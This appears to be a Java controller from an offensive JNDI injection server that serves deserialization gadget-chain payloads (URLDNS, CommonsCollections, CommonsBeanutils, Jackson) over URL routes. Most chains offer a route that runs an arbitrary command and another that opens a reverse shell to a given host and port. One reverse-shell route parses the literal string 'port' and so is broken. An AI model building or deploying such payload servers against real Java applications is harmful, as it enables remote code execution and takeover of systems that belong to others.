package map.jndi.controller;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import map.jndi.gadget.*;

import java.util.*;

@JNDIController
@JNDIMapping("/Deserialize")
public class DeserializeController implements Controller {
    public Object process(byte[] data) {
        return data;
    }

    @JNDIMapping("/{data}")
    public byte[] deserialize(String data) {
        System.out.println("[Deserialize] Custom serialized data");
        return Base64.getDecoder().decode(data);
    }

    @JNDIMapping("/URLDNS/{url}")
    public byte[] URLDNS(String url) throws Exception {
        System.out.println("[Deserialize] [URLDNS] URL: " + url);

        byte[] data = URLDNS.create(url);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK1/Command/{cmd}")
    public byte[] CommonsCollectionsK1Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK1] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsCollectionsK1.create(templatesImpl);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK1/ReverseShell/{host}/{port}")
    public byte[] CommonsCollectionsK1ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK1] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt("port"));
        byte[] data = CommonsCollectionsK1.create(templatesImpl);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK2/Command/{cmd}")
    public byte[] CommonsCollectionsK2Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK2] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsCollectionsK2.create(templatesImpl);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK2/ReverseShell/{host}/{port}")
    public byte[] CommonsCollectionsK2ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK2] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        byte[] data = CommonsCollectionsK2.create(templatesImpl);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK3/Command/{cmd}")
    public byte[] CommonsCollectionsK3Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK3] [Command] Cmd: " + cmd);

        byte[] data = CommonsCollectionsK3.create(cmd);
        return data;
    }

    @JNDIMapping("/CommonsCollectionsK4/Command/{cmd}")
    public byte[] CommonsCollectionsK4Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsCollectionsK4] [Command] Cmd: " + cmd);

        byte[] data = CommonsCollectionsK4.create(cmd);
        return data;
    }

    @JNDIMapping("/CommonsBeanutils183/Command/{cmd}")
    public byte[] CommonsBeanutils183Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils183] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
        return data;
    }

    @JNDIMapping("/CommonsBeanutils183/ReverseShell/{host}/{port}")
    public byte[] CommonsBeanutils183ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils183] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
        return data;
    }

    @JNDIMapping("/CommonsBeanutils194/Command/{cmd}")
    public byte[] CommonsBeanutils194Cmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils194] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
        return data;
    }

    @JNDIMapping("/CommonsBeanutils194/ReverseShell/{host}/{port}")
    public byte[] CommonsBeanutils194ReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [CommonsBeanutils194] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
        return data;
    }

    @JNDIMapping("/Jackson/Command/{cmd}")
    public byte[] JacksonCmd(String cmd) throws Exception {
        System.out.println("[Deserialize] [Jackson] [Command] Cmd: " + cmd);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = Jackson.create(templatesImpl);
        return data;
    }

    @JNDIMapping("/Jackson/ReverseShell/{host}/{port}")
    public byte[] JacksonReverseShell(String host, String port) throws Exception {
        System.out.println("[Deserialize] [Jackson] [ReverseShell] Host: " + host + " Port: " + port);

        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
        byte[] data = Jackson.create(templatesImpl);
        return data;
    }
}
